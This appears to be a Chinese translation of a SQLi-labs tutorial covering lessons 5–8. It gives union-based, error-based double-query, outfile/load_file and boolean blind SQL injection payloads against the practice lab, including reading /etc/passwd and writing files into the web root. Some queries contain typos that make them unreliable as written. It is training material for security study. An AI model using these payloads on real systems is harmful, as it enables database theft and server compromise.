@@ -1,0 +1,458 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><style>/* Fonts */
+@font-face{
+  font-family: octicons-anchor;
+  src: url(data:x-font-woff;charset=utf-8;base64,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) format('woff');
+}
+
+/* Body */
+html { font-size: 100%; overflow-y: scroll; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
+
+body{
+  color:#4d4d4c;
+  font-family:Georgia, Palatino, 'Palatino Linotype', Times, 'Times New Roman',
+              "Hiragino Sans GB", "STXihei", "微软雅黑", serif;
+  font-size:12px;
+  line-height:1.5em;
+  background:#fefefe;
+  width: 45em;
+  margin: 10px auto;
+  padding: 30px;
+  border: 1px solid #ddd;
+  outline: 1300px solid #f8f8f8;
+}
+
+/* Links */
+a{ color: #06d; text-decoration:none; }
+a:hover{ color: #06e; text-decoration: underline; }
+a:active{ color:#faa700; }
+a:focus{ outline: thin dotted; }
+a:hover, a:active{ outline: 0; }
+
+::-moz-selection { background:rgba(255,255,0,0.3); color:#000 }
+::selection { background:rgba(255,255,0,0.3); color:#000 }
+
+a::-moz-selection { background:rgba(255,255,0,0.3); color:#0645ad }
+a::selection { background:rgba(255,255,0,0.3); color:#0645ad }
+
+/* Header Anchor Links*/
+a.headeranchor-link {
+  color:#111;
+  border: 0;
+  margin-left: -20px;
+  padding-right: 6px;
+  cursor: pointer;
+  position: absolute;
+  display: block;
+  top: 0;
+  left: 0;
+  bottom: 0;
+}
+
+span.headeranchor {
+  font: normal normal 16px octicons-anchor;
+  line-height: 1;
+  -moz-osx-font-smoothing: grayscale;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+}
+
+a.headeranchor-link:hover { text-decoration: none;}
+a.headeranchor-link:visited { color:#4d4d4c; }
+a.headeranchor-link:active { color:#4d4d4c; }
+a.headeranchor-link:hover span.headeranchor:before { content: '\f05c'; }
+h1:hover a span.headeranchor:before { content: '\f05c'; }
+h2:hover a span.headeranchor:before { content: '\f05c'; }
+h3:hover a span.headeranchor:before { content: '\f05c'; }
+h4:hover a span.headeranchor:before { content: '\f05c'; }
+h5:hover a span.headeranchor:before { content: '\f05c'; }
+h6:hover a span.headeranchor:before { content: '\f05c'; }
+
+abbr { cursor: pointer; }
+
+/* Paragraphs */
+p { margin:1em 0; }
+
+/* Images */
+img {
+  max-width:100%;
+  border: 0;
+  -ms-interpolation-mode: bicubic;
+  vertical-align: middle;
+}
+
+/* Headers */
+h1,h2,h3,h4,h5,h6 {
+  font-weight:normal;
+  color:#111;
+  line-height: 1.7;
+  position: relative;
+}
+h4,h5,h6{ font-weight: bold; }
+h1 { font-size:2.5em; border-bottom: 1px solid #ddd;}
+h2 { font-size:2em; border-bottom:1px solid #eee; padding-bottom: 5px; }
+h3 { font-size:1.5em; }
+h4 { font-size:1.2em; }
+h5 { font-size:1em; }
+h6 { font-size:0.9em; }
+
+/* Block Quotes */
+blockquote {
+  color:#666666;
+  margin:0;
+  padding-left: 3em;
+  border-left: 0.5em #EEE solid;
+}
+hr { display: block; height: 2px; border: 0; border-top: 1px solid #aaa;border-bottom: 1px solid #eee; margin: 1em 0; padding: 0; }
+
+/* Raw Blocks */
+span.backtick {
+  border:1px solid #EAEAEA;
+  border-radius:3px;
+  background:#F8F8F8;
+  padding:0 3px 0 3px;
+}
+
+pre, code, kbd, samp {
+  color: #000;
+  font-family: Consolas, "Liberation Mono", Menlo, Courier, monospace;
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  font-size: 0.88em;
+  background-color: #F8F8F8;
+  border: 1px solid #CCC;
+}
+
+pre {
+  white-space: pre;
+  white-space: pre-wrap;
+  word-wrap: break-word;
+  padding: 10px;
+}
+
+code { padding: 0 3px 0 3px; }
+pre code { border: 0; padding: 0; }
+
+/* Admonition */
+div.admonition {
+  -webkit-border-radius: 3px;
+  -moz-border-radius: 3px;
+  border-radius: 3px;
+  font-size: 0.88em;
+  padding: 0.5em 1em 0.5em 1em;
+  margin: 10px auto;
+}
+
+div.admonition p {
+  padding: 0;
+  margin: 0.5em 0 0.5em 0;
+}
+
+p.admonition-title {
+  font-weight: bold;
+}
+
+div.admonition.attention {
+  color: #4F8A10;
+  background-color: #DFF2BF;
+  border: 1px solid #4F8A10;
+}
+
+div.admonition.caution {
+  color: #9F6000;
+  background-color: #FEEFB3;
+  border: 1px solid #9F6000;
+}
+
+div.admonition.hint {
+  color: #00529B;
+  background-color: #BDE5F8;
+  border: 1px solid #00529B;
+}
+
+div.admonition.danger {
+  color: #D8000C;
+  background-color: #FFBABA;
+  border: 1px solid #D8000C;
+}
+
+div.admonition.note {
+  color: #888888;
+  background-color: #F8F8F8;
+  border: 1px solid #888888;
+}
+
+/* Inlines */
+b, strong { font-weight: bold; }
+
+ins { background: #ff9; color: #000; text-decoration: none; }
+
+mark { background: #ff0; color: #000; font-style: italic; font-weight: bold; }
+
+sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; }
+sup { top: -0.5em; }
+sub { bottom: -0.25em; }
+
+dfn { font-style: italic; }
+
+/* Lists */
+ul, ol { padding-left: 30px; }
+li p:last-child { margin:0 }
+li.task-list-item { list-style-type: none; }
+li.task-list-item input { float:left; margin-left: -20px; margin-top: 6px; }
+dt { font-weight: bold; font-style: italic;}
+dd { margin: 0 0 0 2em; }
+
+/* Tables */
+table { border-collapse: collapse; border: 1px solid #ddd; background-color: #fefefe; }
+table tr:nth-child(2n) { background-color: #f8f8f8; }
+td, th { border: 1px solid #ddd; padding: 6px 13px; }
+
+/* Codehilite Tables */
+table.codehilitetable { border: 0; border-spacing: 0; width: 100%; }
+td.linenos, td.code, table.codehilitetable td { border: 0; padding: 0; }
+table.codehilitetable td:not(.linenos) div.linenodiv { padding: 0 !important; }
+td.code { width: 100%; }
+table.codehilitetable td.linenos div pre, td div.linenodiv pre {
+  border: 0;
+  border-top: 1px solid #CCC;
+  border-left: 1px solid #CCC;
+  border-right: 1px solid #CCC;
+  border-bottom: 1px solid #CCC;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-left-radius: 3px;
+  -webkit-border-bottom-left-radius: 3px;
+  -moz-border-radius-topleft: 3px;
+  -moz-border-radius-bottomleft: 3px;
+  border-top-left-radius: 3px;
+  border-bottom-left-radius: 3px;
+}
+
+table.codehilitetable td.code div pre {
+  border: 0;
+  border-top: 1px solid #CCC;
+  border-right: 1px solid #CCC;
+  border-bottom: 1px solid #CCC;
+  -webkit-border-radius: 0;
+  -moz-border-radius: 0;
+  border-radius: 0;
+  -webkit-border-top-right-radius: 3px;
+  -webkit-border-bottom-right-radius: 3px;
+  -moz-border-radius-topright: 3px;
+  -moz-border-radius-bottomright: 3px;
+  border-top-right-radius: 3px;
+  border-bottom-right-radius: 3px;
+}
+
+/* Media */
+@media only screen and (min-width: 480px) {
+  body{ font-size:14px; }
+}
+
+@media only screen and (min-width: 768px) {
+  body{ font-size:16px; }
+}
+
+@media print {
+  * { background: transparent !important; color: black !important; filter:none !important; -ms-filter: none !important; }
+  body{ font-size:12pt; max-width:100%; outline:none; border: 0;}
+  a, a:visited { text-decoration: underline; }
+  a.headeranchor-link { display: none; }
+  hr { height: 1px; border:0; border-bottom:1px solid black; }
+  a[href]:after { content: " (" attr(href) ")"; }
+  abbr[title]:after { content: " (" attr(title) ")"; }
+  .ir a:after, a[href^="javascript:"]:after, a[href^="#"]:after { content: ""; }
+  pre, blockquote { border: 1px solid #999; padding-right: 1em; page-break-inside: avoid; }
+  tr, img { page-break-inside: avoid; }
+  img { max-width: 100% !important; }
+  p, h2, h3 { orphans: 3; widows: 3; }
+  h2, h3 { page-break-after: avoid; }
+}
+</style><title>SQLi Labs 指南 Part 2</title></head><body><h3 id="_1"><a name="user-content-_1" href="#_1" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>第五课：不用注释来查询</h3>
+<p>在这节中，我们来学习怎么进行基于错误的双引号注入攻击，如下两个注入：</p>
+<p><code>?id=1′ AND ’2</code></p>
+<p><code>?id=3′ AND ’4</code></p>
+<p><img alt="37.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/37.jpg" /></p>
+<p>注入这两个代码后，数据库显示不同的用户名和密码。现在我们使用联合查询命令来从数据库中得到更多的敏感信息。下面是我们使用的查询语句：</p>
+<p><code>-6′ union select 5, version(),3 AND ’1</code></p>
+<p><img alt="39.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/39.jpg" /></p>
+<p>这次的查询我们使用version()函数懒探测数据库的版本；同样，我们可以用其他不同的查询来从数据库中检索更多的信息。现在我们使用下面的查询来得到当前用户名:</p>
+<p><code>-6′ union select 5,current_user,3 AND ’1</code></p>
+<p><img alt="41.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/41.jpg" /></p>
+<p><strong>译者注</strong></p>
+<p>这个小节的核心内容是用 and 1（数字型）或者and &lsquo;1(单引号)来代替&ndash;+之类的注释符号。</p>
+<p>注意 and 1 不同于 and id=1，如下图所示：</p>
+<p><img alt="yi2.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/yi2.png" /></p>
+<h3 id="-"><a name="user-content--" href="#-" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>第六课：双注入-双引号</h3>
+<p>在这几种我们将会学习怎么进行基于错误的双引号注入攻击，如下图所示：</p>
+<p><code>?id=3</code></p>
+<p><img alt="42.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/42.png" /></p>
+<p>注入查询后，我们可以看到屏幕上出现了一条sql错误信息。在继续之前，我们来讨论一些sql的基本函数（对于程序员和测试者一视同仁）。我们从count函数开始，它会返回行数。</p>
+<p><code>select count(*) from information_schema.tables;</code> </p>
+<p><img alt="45.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/45.jpg" /></p>
+<p>我们来尝试下另一个随机函数。用这个函数我们可以得到一个介于0和1之间的一个随机值。</p>
+<p><code>select rand() ;</code></p>
+<p><img alt="47.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/47.jpg" /></p>
+<p>另一个我们要使用的有趣函数是group by语句；我们来看一个例子：</p>
+<p><code>select table_name, table_schema from information_schema.tables group by table_schema</code></p>
+<p><img alt="49.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/49.jpg" /></p>
+<p>现在我们回到正题，怎么样从一个SQL错误信息中下载数据库。</p>
+<p>选择数据库:</p>
+<p><code>select database();</code></p>
+<p><img alt="50.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/50.png" /></p>
+<p>它显示了我们当前的数据库security。现在我们往（select databas()）里添加一些东西，我们用这个查询来联结输出。</p>
+<p><code>select concat((select database()));</code></p>
+<p><img alt="53.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/53.jpg" /></p>
+<p>现在我们来添加一些有趣的显示，如下：</p>
+<p><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a)</code></p>
+<p>0x3a是十六进制。</p>
+<p><img alt="55.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/55.jpg" /></p>
+<p>将这些查询语句复制到Notepad中，以便我们来构造。</p>
+<p><img alt="61.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/61.jpg" /></p>
+<p>因为<strong>select concat(0x3a,0x3a(select database()),0x3a,0x3a)</strong>这条语句太长，我们来给它一个较短的名字，如a。</p>
+<p>现在查询语句变成了这样：</p>
+<p><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a)a;</code></p>
+<p><img alt="81.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/81.jpg" /></p>
+<p>我们再把这条语句复制到Notepad中。</p>
+<p><img alt="602.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/602.jpg" /></p>
+<p>现在我们再给它加入一些随机性。</p>
+<p><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2))a;</code></p>
+<p><img alt="61.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/61.png" /></p>
+<p>复制Notepad。</p>
+<p><img alt="62.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/62.png" /></p>
+<p>现在我们通过选择一个任意的表，来添加多个值，如下：</p>
+<p><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns;</code></p>
+<p><img alt="63.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/63.png" /></p>
+<p>通过执行这条查询语句，我们可以看到行数。</p>
+<p><img alt="64.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/64.jpg" /></p>
+<p>复制到Notepad。</p>
+<p><img alt="601.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/601.jpg" /></p>
+<p>现在你可以从information_schema中选择任何你想要的数据包和数据库了。如下：</p>
+<p><code>select concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables;</code></p>
+<p><img alt="58.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/58.jpg" /></p>
+<p>执行这条语句后，我们同样可以看到行数。</p>
+<p><img alt="70.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/70.jpg" /></p>
+<p>复制字符串。</p>
+<p><img alt="72.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/72.jpg" /></p>
+<p>现在我们将得到的字符串分组，并将其作为另一个字段添加到之前的字符串里，如下：</p>
+<p><code>select count(*),concat(0x3a,0x3a(select database()),0x3a,0x3a, floor (rand()*2)) a from information_schema.tables group by a;</code></p>
+<p><img alt="75.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/75.jpg" /></p>
+<p>现在，我们从上图的输出中可以看到60:0和67:1。我们将继续接着执行三到四次查询，如下：</p>
+<p><img alt="76.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/76.png" /></p>
+<p>在几次尝试后，我们会得到一个错误信息，因为随机数字重复了。</p>
+<p><img alt="78.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/78.jpg" /></p>
+<p>复制到NotePad。</p>
+<p><img alt="80.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/80.jpg" /></p>
+<p>但是在错误信息里，它告诉了我们核心信息，数据库的名字security，这正是我们想要知道的。我们再来问下它版本名。</p>
+<p><code>select count(*),concat(0x3a,0x3a(select version()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;</code></p>
+<p><img alt="81.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/81.png" /></p>
+<p>如下图，它告诉了我们版本名。</p>
+<p><img alt="831.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/831.jpg" /></p>
+<p>让我们尝试下载数据库用户：</p>
+<p><code>select count(*),concat(0x3a,0x3a(select user()),0x3a,0x3a, floor (rand()*2)) a from information_schema.columns group by a;</code></p>
+<p><img alt="84.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/84.png" /></p>
+<p>使用这个查询几次后，它同样产生了一个SQL错误，并且告诉了我们username。</p>
+<p><img alt="86.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/86.jpg" /></p>
+<p>通过这个技术，我们可以利用SQL的错误信息从数据库下载信息。</p>
+<h2 id="outfile"><a name="user-content-outfile" href="#outfile" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>第七课 通过outfile函数来下载数据库</h2>
+<p>在这节中，我们将要学习怎么下载数据库，我们以截断SQL查询开始，如下：</p>
+<p><code>?id=1′–-+</code></p>
+<p><img alt="88.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/88.jpg" /></p>
+<p>现在我们将要绕过前台在后台讨论一些函数。在你的终端中启动mysql，选择数据库security。</p>
+<p><code>use security;</code></p>
+<p><img alt="90.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/90.jpg" /></p>
+<p>我们通过基本的命令来下载数据库：</p>
+<p><code>select * from users;</code></p>
+<p><img alt="92.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/92.jpg" /></p>
+<p>现在我们来下载数据库，然后通过使用一个叫做“outfile”的函数来让mysql将数据库的内容写到一个文件中，所以查询命令如下：</p>
+<p><code>select * from users into outfile “/tmp/tests.txt”</code></p>
+<p><img alt="94.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/94.jpg" /></p>
+<p>我们来看下test.txt文件的内容。</p>
+<p><img alt="95.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/95.png" /></p>
+<p>我们还有另一个叫做“dumpfile”的函数，dumpfile只能使用一行，所以我们再下载数据库的使用，给一个限制。</p>
+<p><code>select * from users limit 0,1 into dumpfile “/tmp/test2.txt”</code></p>
+<p><img alt="97.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/97.jpg" /></p>
+<p>还有一个用来导入文件的函数。它可以用来从文件系统中将文件导入到mysql中，下面是它的查询命令：</p>
+<p><code>select load_file(“etc/passwd”);</code></p>
+<p><img alt="99.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/99.jpg" /></p>
+<p>它已经下载了密码文件。</p>
+<p><img alt="100.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/100.png" /></p>
+<p>综合上述，我们将密码的下载到一个文件中。查询命令如下：</p>
+<p><code>select load_file(“etc/passwd”) into outfile “tmp/test4.txt”;</code></p>
+<p><img alt="101.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/101.png" /></p>
+<p>让我们来看下test4.txt文件。</p>
+<p><img alt="102.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/102.png" /></p>
+<p>现在哦我们回到前台部分，在地址栏里输入如下查询：</p>
+<p><code>?id=2")) union select 1,2,3 into outfile “/var/www/sqli-labs/Less-7/union2.txt” –-+</code></p>
+<p><img alt="103.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/103.png" /></p>
+<p>现在来检查下union2.txt文件。</p>
+<p><img alt="105.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/105.jpg" /></p>
+<p>通过这种方式，我们可以改变输入的查询命令来获得更多的信息，例如数据库版本，当前用户等，就像我们之前的几节课里所演示的那样。</p>
+<h1 id="-_1"><a name="user-content--_1" href="#-_1" class="headeranchor-link"  aria-hidden="true"><span class="headeranchor"></span></a>第八课：基于布尔-单引号-盲注</h1>
+<p>在这节中，我们将要学习实施盲注，我们从枚举开始，尝试截断查询。</p>
+<p><code>?id=1′</code></p>
+<p><code>?id=1)</code></p>
+<p><img alt="106.png" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/106.png" /></p>
+<p>注入了一些查询后，会发现我们并没有在屏幕上看到错误信息。因此我们不能确定在这个网页上是否存在注入。这也是为什么这种类型的注入叫做盲注。通常有两种类型盲注，基于布尔的和基于时间的注入。</p>
+<p>我们从一些基础开始。启动mysql，并选择默认的数据库：</p>
+<p><code>use security;</code></p>
+<p><img alt="108.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/108.jpg" /></p>
+<p>现在我们来介绍一个新的函数，length()：</p>
+<p><code>select length(database());</code></p>
+<p><img alt="110.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/110.jpg" /></p>
+<p>让我们来向数据库提问些问题，如数据库的第一个字符是否是什么，如果数据库的第一个字符是S，他就会返回一个是真的回答。如果第二个字符是A，那么数据库会的回答将会是假，因为A不属于数据库的名字，但是E也会返回真。现在我们用另一种技术，我们可以通过这种技术来改变我们查询的方法和她返回的方法。有一个可以将字符串截断为几个部分的函数，他叫做substr。查询如下：</p>
+<p><code>select substr(database(),1,1);</code></p>
+<p><img alt="112.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/112.jpg" /></p>
+<p>我们来使用一个叫做ASCII的新函数。这个函数可以用来将字符串转化为ASCII值。这会使我们建设侧数据库的第一个字母变的更容易，如下图所示。我们有一个115的值，使用到的查询为：</p>
+<p><code>select ascii(substr(database(),1,1));</code></p>
+<p><img alt="115.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/115.jpg" /></p>
+<p>现在我们在ASCII表中来查一下115。</p>
+<p><img alt="117.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/117.jpg" /></p>
+<p>检查下第二个字母E的值。它是101。</p>
+<p><img alt="119.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/119.jpg" /></p>
+<p>我们在mysql查询中来查下值：</p>
+<p><code>select ascii(substr(database(),2,1));</code></p>
+<p><img alt="121.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/121.jpg" /></p>
+<p>用这种方式，我们可以得到更多的ASCII值，我们来评估下查询</p>
+<p><code>Select ascii(substr(database(),2,1)) = 101;</code></p>
+<p>等于101。</p>
+<p>是的，它是真的。返回的值是1，因为字母E的ASCII码为101。</p>
+<p><img alt="124.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/124.jpg" /></p>
+<p>下面我们来使用这个查询：</p>
+<p><code>select ascii(substr(database(),2,1)) &lt; 101;</code></p>
+<p><img alt="127.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/127.jpg" /></p>
+<p>结果是假的。因为它等于0，ASCII的值不是小于101，我们来尝试通过下面的这个查询来猜一下第三个字符。</p>
+<p><code>select ascii(substr(database(),3,1)) &lt; 101;</code></p>
+<p><img alt="130.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/130.jpg" /></p>
+<p>结果为1，这意味着是真。所以让它变成97。使用</p>
+<p><code>select ascii(substr(database(),3,1)) &lt; 97;</code></p>
+<p>结果是0；它意味着假，因此有效的值应该在97到101之间。所以现在继续尝试来猜97到101之间的所有值。</p>
+<p><img alt="134.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/134.jpg" /></p>
+<p>我们得到了第三个值是99，在ASCII表中找下它。</p>
+<p><img alt="136.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/136.jpg" /></p>
+<p><img alt="138.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/138.jpg" /></p>
+<p>我们在URL中使用这个查询。</p>
+<p><code>?id=1′ AND (ascii(substr((select database()) ,3,3)) = 99 –-+</code></p>
+<p>屏幕上显示 you are in .........。</p>
+<p>这意味着99是真的。</p>
+<p><img alt="141.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/141.jpg" /></p>
+<p>如果我们将99改为98，会发生什么：</p>
+<p><code>?id=1′ AND (ascii(substr((select database()) ,3,3)) = 98</code></p>
+<p>我们可以看到屏幕上没有发生什么，我们可以得出得到了一个错误。</p>
+<p><img alt="143.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/143.jpg" /></p>
+<p>我们开始枚举数据库，查询是</p>
+<p><code>id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) &lt; 105 –-+</code></p>
+<p>我们可以看到信息：You are in ......。这意味着为真。</p>
+<p><img alt="144.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/144.png" /></p>
+<p>现在让我们尝试下101：</p>
+<p><code>id=1′ AND (ascii(substr((select table_name information_schema.tables where table_schema=database()limit 0,1) ,1,1)) = 101 –-+</code></p>
+<p>现在可以看到一个信息：<br />
+You are in .......。</p>
+<p><img alt="145.jpg" src="E:\novsec\Translation\Archive\SQLi Labs 指南/./img/145.png" /></p>
+<p>它意味着Email的第一个字母是E。</p>
+<p><strong>译者注：</strong></p>
+<p>Note:在URL中，使用的是AND而不是UNION。</p></body></html>
